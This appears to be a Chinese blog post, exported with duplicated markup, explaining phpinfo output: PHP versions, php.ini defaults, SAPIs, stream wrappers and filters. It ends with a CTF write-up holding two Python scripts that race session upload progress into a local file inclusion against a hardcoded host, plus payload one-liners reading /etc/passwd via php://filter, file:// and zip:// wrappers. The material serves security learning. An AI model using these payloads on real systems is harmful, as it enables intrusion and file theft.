\n\n在很古老的时候，rfc3875（ [链接：http://www.ietf.org/rfc/rfc3875](http://www.ietf.org/rfc/rfc3875) ）定义了一种运行Web应用的方法——CGI，PHP也为其提供了名为“CGI/FastCGI”的SAPI，不过用的比较少，不介绍了。 \n\n除此之外，还有一个比较有意思的SAPI，叫embed，这是一个嵌入式SAPI。这个功能就很有意思了，我们能很容易地将PHP解释器集成到自己的程序里。比如Laruence在08年曾写过一篇《使用PHP Embed SAPI实现Opcodes查看器》的文章：[链接：](http://www.laruence.com/2008/09/23/539.html)[使用PHP Embed SAPI实现Opcodes查看器 | 风雪之隅](http://www.laruence.com/2008/09/23/539.html) 。 \n\n原理也比较简单，就是在外部调用PHP内核的zend_compile_file函数，将代码转换成OPCODE，然后输出。\n\n uwsgi的PHP插件，也是利用内嵌embed的PHP，我们可以在 [链接：](https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile)[vulhub/Dockerfile at master · vulhub/vulhub · GitH...](https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile) 看到整个编译的过程。 \n\nphpdbg是php5.4及以后加入的一个php交互式调试器，他也是一个sapi。\n\n## php支持的协议\n\n图8，Registered PHP Streams中列出了PHP默认支持的一些协议。 我们来一一介绍一下。 \n\nhttps和http自然不用说，用来包装http协议，我们可以执行readfile('[链接：](http://www.example.com/)[Example Domain](http://www.example.com/)');来发送一个http请求。 \n\nftps和ftp，用来包装ftp协议，和http类似。 \n\ncompress.zlib用来处理zlib压缩过的数据，比如我们可以用readfile('compress.zlib://file.gz');来读取用zlib压缩过的文件。 \n\nphp是php特有的协议，用其可以访问输入输出流，并进行过滤、编码等操作。其支持的功能有很多，可以参考这个文档：[链接：](http://php.net/manual/zh/wrappers.php.php)[PHP: php:// - Manual](http://php.net/manual/zh/wrappers.php.php) \n\nfile用来访问本地文件，比如readfile('file:///etc/passwd');\n\n glob用来以模式匹配的方式访问本地目录，比如 dir('glob:///etc/*')。 \n\ndata可以用url的方式来模拟一个输入流（RFC 2397），比如，readfile通常是用来读取文件中的内容，但我们可以通过 readfile('data://text/plain;base64,SGVsbG8='); 来解码base64串，并将其作为输入流读取。 \n\nphar是用来读写PHP归档，PHP归档类似于Java的.jar文件，我们可以将一个完整的PHP项目（可能包含数百个文件）打包成一个.phar，比如composer.phar。phar流就负责读写这个文件。\n\n 除此之外，常见的协议还有zip://，用来读写zip格式的压缩文件；\n\ncompress.bzip2://用来读写bz2压缩的文件。这些协议可能需要额外安装扩展。\n\n另外，用户也可以定义自己的流，即实现streamWrapper类中的方法，这块我就不介绍了。\n\n图8:\n\n![](https://file.zsxq.com/179/b6/79b6f16973ae9a0c370e62e0f7fa11f401121107e39d1ac9bc0e6a486ba8075d.png)\n\n## Registered Stream Filters\n\nRegistered Stream Filters列出了一些默认支持的filter流。（图9） 其实PHP中的filter流，是和协议密不可分的。协议的作用是读写文件（包括正常文件、目录、输入输出等），而filter流的作用就是在读写的中途对数据进行过滤和编码，相当于是一个HOOK。 \n\nzlib.\\*用来压缩和解压数据，和compress.zlib://协议不同的是，用zlib流可以压缩、解压任何其他协议里传输的数据。 \n\nconvert.iconv.\\*用来转换编码。 \n\nstring.\\*用来做字符串转换，比如string.strip_tags用来去除字符串中的标签，string.tolower用来将字符串转换成小写。 \n\nconvert.\\*用来转换数据，比如用convert.base64-decode可以做base64的解码。其实我觉得放在string.*里也可以。 \n\ndechunk用来处理chunk相关的数据，chunk是HTTP1.1中传输流式数据的方式（ [链接：](https://en.wikipedia.org/wiki/Chunked_transfer_encoding)[Chunked transfer encoding - Wikipedia](https://en.wikipedia.org/wiki/Chunked_transfer_encoding) ），用这个filter流就能将chunk解开。 consumed应该是用来计算数据字符数量的。\n\n 在PHP里，我们可以用stream_filter_append函数将上述流，附加在某个输入输出资源上。当然，更常见的用法是，我们可以用php://filter协议来使用上述流，比如 readfile('php://filter/read=convert.base64-encode/resource=/etc/passwd'); 关于php://filter的一些有趣的技巧，可以阅读这篇文章 [链接：](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)[谈一谈php://filter的妙用 | 离别歌](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)  。\n\n图9:\n\n![](https://file.zsxq.com/142/62/426224a833018047b952319a5e72bea0f85227707d522c748fa533acf12f6b17.png)\n\n## session uplaod\n\n图10:\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7ddab932-75fc-1.png)\n\n`session.upload_progress.enabled = on` 说明可以覆盖session\n\n`clean up`说明需要竞争\n\n图11：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dcda382-75fc-1.png)\n\nsessionupload.py\n\n```\n#!coding:utf-8\nimport requests\nimport time\n\nurl = 'http://116.62.71.206:52872/?f=login.php'\ndata = {'name':'admin','pass':'sctf2018_h656cDBkU2'}\n\nr = requests.post(url,data = data)\nPHPSESSID = r.cookies['PHPSESSID']\nprint 'input the PHPSESSID in include.py' +'\\n' + PHPSESSID\ntime.sleep(10)\n\nwhile 1:\n    url = 'http://116.62.71.206:52872/?f=upload_sctf2018_C9f7y48M75.php'\n    files = { \n    \"PHP_SESSION_UPLOAD_PROGRESS\" : (None,'<?php echo file_get_contents(\"/tmp/flag_56CcE97QGNxDEXNpW3HY\");?>'),  \n\n    \"upload\" : (\"tmp.jpg\", open(\"tmp.png\", \"rb\"), \"image/png\"), \n\n    \"submit\" : (None,\"submit\")\n    }  \n    #proxies = {'http':'http://127.0.0.1:8080'}\n    headers = {'Cookie':'PHPSESSID=' + PHPSESSID}\n    r = requests.post(url,files = files , headers = headers)\n    print r.text\n    print PHPSESSID\n    #开了cleanup，需要竞争，并且保持回话的session\n```\n\ninclude.py\n\n```\n#!coding:utf-8\n\nimport requests\nPHPSESSID = 'qc2kavokdjiiepu283hduivod2'\nwhile 1:\n    url = 'http://116.62.71.206:52872/?f=aa://../../../../var/lib/php/sessions/sess_' + PHPSESSID\n    print url\n    r = requests.get(url)\n    if 'SCTF' in r.text:\n        print r.text\n        break\n```\n\n\n\n## 案例\n\n以前我在博客里讲过不少和协议有关的安全tricks，大家也分享过一些，今天来温故一下。 \n\n利用php filter绕过死亡exit：[链接：](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)[谈一谈php://filter的妙用 | 离别歌](https://www.leavesongs.com/PENETRATION/php-filter-magic.html) \n\n利用phar/zip协议绕过有后缀的文件包含：include zip:///var/www/html/upload/1.gif#1.php \n\n利用curl+gopher协议进行SSRF漏洞利用： [链接：](http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html)[Do Evil Things with gopher://](http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html) \n\nSSRF检查host时进行文件读取：file://localhost/etc/passwd \n\n利用php协议+zlib.inflate流压缩数据，突破libxml解析器限制的实体长度 \n\nphp://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd","slug":"phpinfo解读","published":1,"updated":"2018-06-30T11:30:38.974Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12hn000xqkdl490mnme5","content":"<h1 id=\"phpinfo解读\"><a href=\"#phpinfo解读\" class=\"headerlink\" title=\"phpinfo解读\"></a>phpinfo解读</h1><a id=\"more\"></a>\n<p>我们以 <a href=\"http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php\" target=\"_blank\" rel=\"noopener\">phpinfo()</a> 为例来讲解吧。</p>\n<h2 id=\"版本更迭\"><a href=\"#版本更迭\" class=\"headerlink\" title=\"版本更迭\"></a>版本更迭</h2><p>phpinfo里最显眼的信息，也就是其标题（图1），其中包含PHP的版本信息。 PHP 5.6 是官方最后一个支持的PHP 5版本，不过，这个版本也已经于2017年1月19号停止功能性更新，只提供安全更新。到2018年12月31号为止，PHP 5.6也将完全终止更新，PHP5彻底退出历史舞台。</p>\n<p> PHP7里提供了很多更好用的语法、函数，也极大改进了安全性。举几个简单的例子：</p>\n<ol>\n<li>移除不支持SQL预编译的Mysql扩展：mysql </li>\n<li>移除preg_replace中容易导致代码执行漏洞的正则模式：e </li>\n<li>assert从一个函数变成一个语法结构（类似eval，无法再动态调用。至此，大量PHP一句话木马将失效），7.2中废弃字符串形式的参数 </li>\n<li>hex字符串（如0xf4c3b00c）不再被作为数字，is_numeric也不再认可，可见 <a href=\"https://3v4l.org/ORuc7\" target=\"_blank\" rel=\"noopener\">链接：https://3v4l.org/ORuc7</a> </li>\n<li>7.2中废弃可以动态执行字符串的 create_function </li>\n<li>7.2中废弃容易导致变量覆盖的无第二个参数的parse_str </li>\n<li>移除<code>&lt;script language=&quot;php&quot;\\&gt;</code>和<code>&lt;%</code>，这两种另类的PHP标签 </li>\n<li>移除dl函数</li>\n</ol>\n<p>这里是关于PHP版本支持的一些说明 <a href=\"http://php.net/supported-versions.php\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://php.net/supported-versions.php\" target=\"_blank\" rel=\"noopener\">PHP: Supported Versions</a> PHP5从5.2到5.6，其实也做了很多改进，以前分享过一篇文章 <a href=\"http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html\" target=\"_blank\" rel=\"noopener\">php各版本的姿势(2017-02-15更新) - l3m0n - 博客园</a> 大家可以再温故一下，我就不再介绍了。</p>\n<p>和版本有关的一些tricks：</p>\n<ul>\n<li><a href=\"https://tricking.io/card/26/description\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://tricking.io/card/26/description\" target=\"_blank\" rel=\"noopener\">梧桐百科 - 碎片化知识学习</a> - </li>\n<li><a href=\"https://tricking.io/card/24/description\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://tricking.io/card/24/description\" target=\"_blank\" rel=\"noopener\">梧桐百科 - 碎片化知识学习</a> - </li>\n<li><a href=\"https://tricking.io/card/2/description\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://tricking.io/card/2/description\" target=\"_blank\" rel=\"noopener\">梧桐百科 - 碎片化知识学习</a> </li>\n</ul>\n<p>这个两个在线工具可以用来在PHP多版本（包括小版本）中执行代码，进而比较他们之前的区别： </p>\n<ul>\n<li><a href=\"https://3v4l.org/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://3v4l.org/\" target=\"_blank\" rel=\"noopener\">Online PHP editor | Run code in 200  PHP &amp; HHVM ve…</a> </li>\n<li><a href=\"http://sandbox.onlinephpfunctions.com/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://sandbox.onlinephpfunctions.com/\" target=\"_blank\" rel=\"noopener\">PHP Sandbox, test PHP online, PHP tester</a></li>\n</ul>\n<h2 id=\"php-ini\"><a href=\"#php-ini\" class=\"headerlink\" title=\"php.ini\"></a>php.ini</h2><p>图1中的四项配置，与php.ini有关。</p>\n<p>图一:</p>\n<p><img src=\"https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png\" alt=\"\"></p>\n<p> php.ini是php的配置文件，但其实并不一定每个php环境都会有这个文件。比如我图1中的这个环境，其“Loaded Configuration File”的值是“(none)”，其实就是没有。如果我们没有指定php.ini文件，那么php的所有配置都会使用默认配置。 </p>\n<p>这里有一点值得注意，那就是“默认配置”的含义： </p>\n<ol>\n<li>没有任何php.ini时，某个配置项默认的值 </li>\n<li>用apt等源管理工具安装php后，默认php.ini里配置的值 </li>\n</ol>\n<p>上述两个“默认配置”在大部分情况下是相同的，但还是有些许不同。 举个简单的例子，配置项request_order用来指定PHP的\\$_REQUEST变量以何种顺序取值。《Discuz! 6.x/7.x 全局变量防御绕过导致代码执行》（ <a href=\"https://www.secpulse.com/archives/2338.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.secpulse.com/archives/2338.html\" target=\"_blank\" rel=\"noopener\">Discuz! 6.x/7.x 全局变量防御绕过导致命令执行 - SecPulse.COM | 安全…</a> ） 就与这个配置有关。 (Discuz那个链接看着有点迷糊，我看的这个<a href=\"http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html\" target=\"_blank\" rel=\"noopener\">Discuz!某两个版本前台产品命令执行（无需登录） | WooYun-2014-80723 | W…</a>)。</p>\n<p>文中提到，因为PHP5.3以后request_order的默认值变成GP，不再包含\\$_COOKIE，所以导致通过\\$_COOKIE来覆盖变量，造成代码执行。</p>\n<p> 其实文中说的request_order默认值变成GP，指的是第2种情况。也就是说，如果一个完全没有任何php.ini文件的php环境，其默认的request_order，仍然是GPC，而非GP。 我们可以来实验一下，首先用docker启动一个php环境（docker的php环境是没有php.ini的）： </p>\n<blockquote>\n<p>docker run –rm –name php1 -it -p 8080:80 -v <code>pwd</code>:/var/www/html php:7.2-apache </p>\n</blockquote>\n<p>再用docker启动一个默认的debian环境，并用apt源安装php5：</p>\n<blockquote>\n<p>docker run –rm –name php2 -it -p 8081:80 -v <code>pwd</code>:/var/www/html debian:8 bash apt-get update &amp;&amp; apt-get install -y php5 </p>\n<p>php -S 0.0.0.0:80 -t /var/www/html </p>\n</blockquote>\n<p>然后，我们输出一下两个环境的request_order取值，以及\\$_REQUEST变量：图2。 可见，在request_order为空的时候，\\$_REQUEST可以取到$_COOKIE中的值；而request_order=GP的时候，就已经取不到了。我们查看第二个环境的php.ini文件，也可以看到request_order的取值：图3。</p>\n<p> 所以，这两种默认值的含义，需要区分清楚，避免出现错误。</p>\n<p>图二:</p>\n<p><img src=\"https://file.zsxq.com/1d6/59/d659ac1a237468325de98f2cfc0802548d77e8a7ebd9d1a80d0390d2d0b2b7e2.png\" alt=\"\"></p>\n<p>图三:</p>\n<p><img src=\"https://file.zsxq.com/164/c8/64c85402cb752d1d7a5a2fbec6bf434338de9526b3836c08c28cb9382609a720.png\" alt=\"\"></p>\n<p>win10: 本地win10+phpstudy+apache中5.3.29-nts与5.4.45-nts中的requests_order方式是”CGP”</p>\n<p>除了默认php配置，还有两个配置项我没说。在编译PHP的时候，我们可以指定–with-config-file-path和–with-config-file-scan-dir。`</p>\n<p> 这两个配置项的意思是，PHP会在–with-config-file-path指定的目录下寻找php.ini文件，如果找到则加载之；除此之外，PHP还会在–with-config-file-scan-dir指定的目录下，寻找所有以.ini为后缀的文件，加载其为配置文件，这个配置是可以覆盖php.ini中配置的。 所以，通常用apt-get install php-pdo来安装php扩展，都会在–with-config-file-scan-dir下写入新的配置文件，而不是修改php.ini。 </p>\n<p>这样，我们如果遇到phpinfo页面，即可用过这两个配置项，来定位php.ini以及额外配置文件的位置。甚至来说，如果这两个目录可写，我们就能写入自己的php配置，进而达成跨站、提权等目的。</p>\n<p>图四:</p>\n<p><img src=\"https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png\" alt=\"\"></p>\n<h2 id=\"SAPI\"><a href=\"#SAPI\" class=\"headerlink\" title=\"SAPI\"></a>SAPI</h2><p>见图5，Server API 指的是当前PHP运行在哪一种模式下。SAPI是PHP内核的一个概念，相当于是PHP核心解释器和应用层（如Web中间件）的一个桥梁。我们需要在SAPI里实现一些函数，供PHP底层调用。 </p>\n<p>这篇文章（ <a href=\"https://foio.github.io/php-sapi/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://foio.github.io/php-sapi/\" target=\"_blank\" rel=\"noopener\">理解php内核中SAPI的作用 – 积木村の研究所</a> ）里举了个简单的例子：cli和cgi这两个SAPI，均需要实现sapi_cgi_read_cookies函数，但cli模式下没有cookie，所以该函数返回null；cgi模式下，cookie从HTTP头中获取，所以返回的是getenv(“HTTP_COOKIE”)。 </p>\n<p>下面介绍一些常用的SAPI。 图5中的FPM/FastCGI指的就是一种SAPI，其提供了一种以fastcgi协议和Web中间件（如Nginx）通信的接口，具体流程可以阅读我的这篇文章（ <a href=\"https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html\" target=\"_blank\" rel=\"noopener\">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 | 离别歌</a>  ）。</p>\n<p>图5:</p>\n<p><img src=\"https://file.zsxq.com/1a0/72/a072352975fb3a7f091f12f1f51c359d246c1ea1dded3a33be4300fc81d143c8.png\" alt=\"\"></p>\n<p> PHP为Apache提供了一个专用了SAPI——Apache 2.0 Handler。相当于是把PHP编译成一个动态链接库，作为Apache的一个模块。</p>\n<p> 当然，Apache也不一定必须用这种SAPI，他同样也支持用Fastcgi和PHP-FPM通信。所以，即使你在实战中遇到了服务器是Apache的环境，也不能就此认定其一定存在Apache模块。你可以尝试下载一个PHPStudy，来看看是否有apache_get_version函数，答案是否定的。 我们平时在命令行里运行PHP，比如php -i （在命令行下执行phpinfo的方法），你可以看到此时的Server API是“Command Line Interface”：图6。</p>\n<p>图6:</p>\n<p><img src=\"https://file.zsxq.com/1b6/61/b661242ec92dae5334dd695b75c7a3ad2f8a028c8cbc59151eec9230cc7d9a45.png\" alt=\"\"></p>\n<p>这个SAPI就是给命令行用的。 </p>\n<p>另外，PHP5.4及以后，我们可以用 php -S localhost:8080 来启动PHP内置的Web server。这个Web server其实也是一个SAPI，名为“Built-in HTTP server”：图7。 </p>\n<p>图7:</p>\n<p><img src=\"https://file.zsxq.com/1b2/bb/b2bbf2fcb9f5d5088f55dc290570ba84f8c0cc86af9786bbaa5b02b77372fdb8.png\" alt=\"PHP\"> </p>\n<p>Built-in Server相当于实现了一个Web文件服务器，然后将PHP有关的请求发给“Built-in HTTP server”这个SAPI，最终交给解释器解析。 </p>\n<p>在很古老的时候，rfc3875（ <a href=\"http://www.ietf.org/rfc/rfc3875\" target=\"_blank\" rel=\"noopener\">链接：http://www.ietf.org/rfc/rfc3875</a> ）定义了一种运行Web应用的方法——CGI，PHP也为其提供了名为“CGI/FastCGI”的SAPI，不过用的比较少，不介绍了。 </p>\n<p>除此之外，还有一个比较有意思的SAPI，叫embed，这是一个嵌入式SAPI。这个功能就很有意思了，我们能很容易地将PHP解释器集成到自己的程序里。比如Laruence在08年曾写过一篇《使用PHP Embed SAPI实现Opcodes查看器》的文章：<a href=\"http://www.laruence.com/2008/09/23/539.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://www.laruence.com/2008/09/23/539.html\" target=\"_blank\" rel=\"noopener\">使用PHP Embed SAPI实现Opcodes查看器 | 风雪之隅</a> 。 </p>\n<p>原理也比较简单，就是在外部调用PHP内核的zend_compile_file函数，将代码转换成OPCODE，然后输出。</p>\n<p> uwsgi的PHP插件，也是利用内嵌embed的PHP，我们可以在 <a href=\"https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile\" target=\"_blank\" rel=\"noopener\">vulhub/Dockerfile at master · vulhub/vulhub · GitH…</a> 看到整个编译的过程。 </p>\n<p>phpdbg是php5.4及以后加入的一个php交互式调试器，他也是一个sapi。</p>\n<h2 id=\"php支持的协议\"><a href=\"#php支持的协议\" class=\"headerlink\" title=\"php支持的协议\"></a>php支持的协议</h2><p>图8，Registered PHP Streams中列出了PHP默认支持的一些协议。 我们来一一介绍一下。 </p>\n<p>https和http自然不用说，用来包装http协议，我们可以执行readfile(‘<a href=\"http://www.example.com/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://www.example.com/\" target=\"_blank\" rel=\"noopener\">Example Domain</a>‘);来发送一个http请求。 </p>\n<p>ftps和ftp，用来包装ftp协议，和http类似。 </p>\n<p>compress.zlib用来处理zlib压缩过的数据，比如我们可以用readfile(‘compress.zlib://file.gz’);来读取用zlib压缩过的文件。 </p>\n<p>php是php特有的协议，用其可以访问输入输出流，并进行过滤、编码等操作。其支持的功能有很多，可以参考这个文档：<a href=\"http://php.net/manual/zh/wrappers.php.php\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://php.net/manual/zh/wrappers.php.php\" target=\"_blank\" rel=\"noopener\">PHP: php:// - Manual</a> </p>\n<p>file用来访问本地文件，比如readfile(‘file:///etc/passwd’);</p>\n<p> glob用来以模式匹配的方式访问本地目录，比如 dir(‘glob:///etc/*’)。 </p>\n<p>data可以用url的方式来模拟一个输入流（RFC 2397），比如，readfile通常是用来读取文件中的内容，但我们可以通过 readfile(‘data://text/plain;base64,SGVsbG8=’); 来解码base64串，并将其作为输入流读取。 </p>\n<p>phar是用来读写PHP归档，PHP归档类似于Java的.jar文件，我们可以将一个完整的PHP项目（可能包含数百个文件）打包成一个.phar，比如composer.phar。phar流就负责读写这个文件。</p>\n<p> 除此之外，常见的协议还有zip://，用来读写zip格式的压缩文件；</p>\n<p>compress.bzip2://用来读写bz2压缩的文件。这些协议可能需要额外安装扩展。</p>\n<p>另外，用户也可以定义自己的流，即实现streamWrapper类中的方法，这块我就不介绍了。</p>\n<p>图8:</p>\n<p><img src=\"https://file.zsxq.com/179/b6/79b6f16973ae9a0c370e62e0f7fa11f401121107e39d1ac9bc0e6a486ba8075d.png\" alt=\"\"></p>\n<h2 id=\"Registered-Stream-Filters\"><a href=\"#Registered-Stream-Filters\" class=\"headerlink\" title=\"Registered Stream Filters\"></a>Registered Stream Filters</h2><p>Registered Stream Filters列出了一些默认支持的filter流。（图9） 其实PHP中的filter流，是和协议密不可分的。协议的作用是读写文件（包括正常文件、目录、输入输出等），而filter流的作用就是在读写的中途对数据进行过滤和编码，相当于是一个HOOK。 </p>\n<p>zlib.*用来压缩和解压数据，和compress.zlib://协议不同的是，用zlib流可以压缩、解压任何其他协议里传输的数据。 </p>\n<p>convert.iconv.*用来转换编码。 </p>\n<p>string.*用来做字符串转换，比如string.strip_tags用来去除字符串中的标签，string.tolower用来将字符串转换成小写。 </p>\n<p>convert.*用来转换数据，比如用convert.base64-decode可以做base64的解码。其实我觉得放在string.*里也可以。 </p>\n<p>dechunk用来处理chunk相关的数据，chunk是HTTP1.1中传输流式数据的方式（ <a href=\"https://en.wikipedia.org/wiki/Chunked_transfer_encoding\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://en.wikipedia.org/wiki/Chunked_transfer_encoding\" target=\"_blank\" rel=\"noopener\">Chunked transfer encoding - Wikipedia</a> ），用这个filter流就能将chunk解开。 consumed应该是用来计算数据字符数量的。</p>\n<p> 在PHP里，我们可以用stream_filter_append函数将上述流，附加在某个输入输出资源上。当然，更常见的用法是，我们可以用php://filter协议来使用上述流，比如 readfile(‘php://filter/read=convert.base64-encode/resource=/etc/passwd’); 关于php://filter的一些有趣的技巧，可以阅读这篇文章 <a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">谈一谈php://filter的妙用 | 离别歌</a>  。</p>\n<p>图9:</p>\n<p><img src=\"https://file.zsxq.com/142/62/426224a833018047b952319a5e72bea0f85227707d522c748fa533acf12f6b17.png\" alt=\"\"></p>\n<h2 id=\"session-uplaod\"><a href=\"#session-uplaod\" class=\"headerlink\" title=\"session uplaod\"></a>session uplaod</h2><p>图10:</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7ddab932-75fc-1.png\" alt=\"\"></p>\n<p><code>session.upload_progress.enabled = on</code> 说明可以覆盖session</p>\n<p><code>clean up</code>说明需要竞争</p>\n<p>图11：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dcda382-75fc-1.png\" alt=\"\"></p>\n<p>sessionupload.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!coding:utf-8</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">url = &apos;http://116.62.71.206:52872/?f=login.php&apos;</span><br><span class=\"line\">data = &#123;&apos;name&apos;:&apos;admin&apos;,&apos;pass&apos;:&apos;sctf2018_h656cDBkU2&apos;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">r = requests.post(url,data = data)</span><br><span class=\"line\">PHPSESSID = r.cookies[&apos;PHPSESSID&apos;]</span><br><span class=\"line\">print &apos;input the PHPSESSID in include.py&apos; +&apos;\\n&apos; + PHPSESSID</span><br><span class=\"line\">time.sleep(10)</span><br><span class=\"line\"></span><br><span class=\"line\">while 1:</span><br><span class=\"line\">    url = &apos;http://116.62.71.206:52872/?f=upload_sctf2018_C9f7y48M75.php&apos;</span><br><span class=\"line\">    files = &#123; </span><br><span class=\"line\">    &quot;PHP_SESSION_UPLOAD_PROGRESS&quot; : (None,&apos;&lt;?php echo file_get_contents(&quot;/tmp/flag_56CcE97QGNxDEXNpW3HY&quot;);?&gt;&apos;),  </span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;upload&quot; : (&quot;tmp.jpg&quot;, open(&quot;tmp.png&quot;, &quot;rb&quot;), &quot;image/png&quot;), </span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;submit&quot; : (None,&quot;submit&quot;)</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    #proxies = &#123;&apos;http&apos;:&apos;http://127.0.0.1:8080&apos;&#125;</span><br><span class=\"line\">    headers = &#123;&apos;Cookie&apos;:&apos;PHPSESSID=&apos; + PHPSESSID&#125;</span><br><span class=\"line\">    r = requests.post(url,files = files , headers = headers)</span><br><span class=\"line\">    print r.text</span><br><span class=\"line\">    print PHPSESSID</span><br><span class=\"line\">    #开了cleanup，需要竞争，并且保持回话的session</span><br></pre></td></tr></table></figure>\n<p>include.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!coding:utf-8</span><br><span class=\"line\"></span><br><span class=\"line\">import requests</span><br><span class=\"line\">PHPSESSID = &apos;qc2kavokdjiiepu283hduivod2&apos;</span><br><span class=\"line\">while 1:</span><br><span class=\"line\">    url = &apos;http://116.62.71.206:52872/?f=aa://../../../../var/lib/php/sessions/sess_&apos; + PHPSESSID</span><br><span class=\"line\">    print url</span><br><span class=\"line\">    r = requests.get(url)</span><br><span class=\"line\">    if &apos;SCTF&apos; in r.text:</span><br><span class=\"line\">        print r.text</span><br><span class=\"line\">        break</span><br></pre></td></tr></table></figure>\n<h2 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h2><p>以前我在博客里讲过不少和协议有关的安全tricks，大家也分享过一些，今天来温故一下。 </p>\n<p>利用php filter绕过死亡exit：<a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">谈一谈php://filter的妙用 | 离别歌</a> </p>\n<p>利用phar/zip协议绕过有后缀的文件包含：include zip:///var/www/html/upload/1.gif#1.php </p>\n<p>利用curl+gopher协议进行SSRF漏洞利用： <a href=\"http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html\" target=\"_blank\" rel=\"noopener\">Do Evil Things with gopher://</a> </p>\n<p>SSRF检查host时进行文件读取：file://localhost/etc/passwd </p>\n<p>利用php协议+zlib.inflate流压缩数据，突破libxml解析器限制的实体长度 </p>\n<p>php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"phpinfo解读\"><a href=\"#phpinfo解读\" class=\"headerlink\" title=\"phpinfo解读\"></a>phpinfo解读</h1>","more":"<p>我们以 <a href=\"http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php\" target=\"_blank\" rel=\"noopener\">phpinfo()</a> 